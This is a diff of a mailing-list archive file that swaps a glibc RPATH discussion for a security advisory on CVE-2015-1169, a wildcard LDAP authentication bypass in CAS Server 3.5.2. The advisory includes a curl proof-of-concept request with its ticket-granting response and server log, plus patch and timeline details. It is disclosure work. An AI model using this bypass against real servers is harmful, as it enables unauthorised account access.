@@ -1,46 +1,100 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/20/8
-Message-ID: <20150220073450.GS23507@oevtugenva.nrevsny.pk>
-Date: Fri, 20 Feb 2015 02:34:50 -0500
-From: Rich Felker <dalias@...c.org>
-To: oss-security@...ts.openwall.com
-Cc: Paul Pluzhnikov <ppluzhnikov@...gle.com>
-Subject: Re: Fixing the glibc runtime linker
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/21/11
+Message-ID: <CAFCb7ujG562x5DwhF_+zJQCh5om+Ux-4tur6kJWa21QHFR3T6A@mail.gmail.com>
+Date: Wed, 21 Jan 2015 12:49:38 -0200
+From: "J. Tozo" <juniorbsd@...il.com>
+To: oss-security@...ts.openwall.com, fulldisclosure@...lists.org
+Subject: CVE-2015-1169 - CAS Server 3.5.2 allows remote attackers to bypass LDAP authentication via crafted wildcards.
 Content-Type: text/plain; charset=utf-8
 
-On Fri, Feb 20, 2015 at 06:30:41AM +0000, Tim Brown wrote:
-> On Friday 20 February 2015 01:38:31 Paul Pluzhnikov wrote:
-> > On Thu, Feb 19, 2015 at 2:19 PM, Tim Brown <tmb@...35.com> wrote:
-> > > More often than not, the underlying issue is an empty element within the
-> > > DT_RPATH header or equivalent. Sometimes it's not, but even in those
-> > > cases, it is largely that one or more elements isn't qualifed (i.e. it
-> > > doesn't start with /). The attached patch fixes this, by ignoring any
-> > > elements of DT_RPATH, LD_LIBRARY_PATH that do not start with a /, and/or
-> > > junking any use of dlopen where the filename is likewise unqualified.
-> > > 
-> > > Won't this break stuff?
-> > 
-> > FWIW, relative RPATHs are quite fundamental to our test execution
-> > environment, and any patch that unconditionally ignores them would
-> > have to be reverted in our tree.
-> 
-> That's useful to know. Is that for setuid binaries or more generally? As I 
-> noted, it would be dead easy only to use the part of the patch that rejects 
-> them for the former only. Although as I said, that offers less protection. 
-> Would that make the patch more consumable? Another option would be to have 
-> something like /etc/suid-debug which could flag that an override is in 
-> operation.
+=====[Alligator Security Team - Security Advisory]========
 
-I don't see how you think this is a security issue at all. The RPATH
-is _in the binary_ that you're running. It's not an input at runtime.
-If relative paths are used (either ${ORIGIN}-relative or cwd-relative)
-then the base (location of the executable file or working directory)
-is an input, but the fact that they're being used is a matter of how
-the binary was generated, not how it was invoked. Anyone can
-intentionally make a binary that does unsafe things (e.g.
-system(argv[1])) as suid. Limiting the usefulness of RPATH does not
-seem to contribute to security, especially since RPATH is not used at
-all by default and has to be manually setup, presumably by somebody
-who knows what they're doing.
+  CVE-2015-1169 - CAS Server 3.5.2 allows remote attackers to bypass LDAP
+authentication via crafted wildcards.
 
-Rich
+  Reporter: José Tozo  < juniorbsd () gmail com >
+
+=====[Table of Contents]==================================
+
+1. Background
+2. Detailed description
+3. Other contexts & solutions
+4. Timeline
+5. References
+
+=====[1. Background]======================================
+
+ CAS is an authentication system originally created by Yale University to
+provide a trusted way for an application to authenticate a user.
+
+=====[2. Detailed description]============================
+
+A valid username and password required.
+
+Given a username johndoe and a password superpass, you can sucessfully
+achieve login using wildcards:
+
+username: jo*
+password: superpass
+
+The login will be sucessfully only if the ldap bind search return one
+unique member.
+
+The vulnerability described in this document can be validated using the
+following example:
+
+Client Request:
+root@...hine:/# curl -k -L -d "username=jo%2A&password=superpass"
+https://login.cas-server.com/v1/tickets
+
+(note that * was url encoded to %2A)
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html>
+   <head>
+      <title>201 The request has been fulfilled and resulted in a new
+resource being created</title>
+   </head>
+   <body>
+      <h1>TGT Created</h1>
+      <form action="
+https://xxx.xxx.xxx.xxx/v1/tickets/TGT-76-ABTSuXWB7sECDGqbe5W4jyxR43YYiTubPsEup9m4gNFpytGSaz"
+method="POST">Service:<input type="text" name="service" value=""><br><input
+type="submit" value="Submit"></form>
+   </body>
+</html>
+
+Server log:
+=============================================================
+WHO: [username: jo*]
+WHAT: TGT-76-ABTSuXWB7sECDGqbe5W4jyxR43YYiTubPsEup9m4gNFpytGSaz
+ACTION: TICKET_GRANTING_TICKET_CREATED
+APPLICATION: CAS
+WHEN: Tue Jan 20 18:38:17 BRST 2015
+CLIENT IP ADDRESS: xxx.xxx.xxx.xxx
+SERVER IP ADDRESS: xxx.xxx.xxx.xxx
+=============================================================
+
+=====[3. Other contexts & solutions]======================
+
+ In order to apply the patch, you have to update at least to version 3.5.3.
+Newer versions, such as CAS 4.0.0 and above, are not vulnerable.
+
+=====[4. Timeline]========================================
+
+29/12/14 Vendor notification.
+14/01/15 Vendor rolled out new version 3.5.3
+17/01/15 Mitre assigned CVE-2015-1169.
+21/01/15 Disclosure date.
+
+=====[5. References]=======================================
+
+1 - https://github.com/Jasig/cas/pull/411
+2 -
+https://github.com/Jasig/cas/commit/7de61b4c6244af9ff8e75a2c92a570f3b075309c
+
+-- 
+Grato,
+
+ Tozo
+
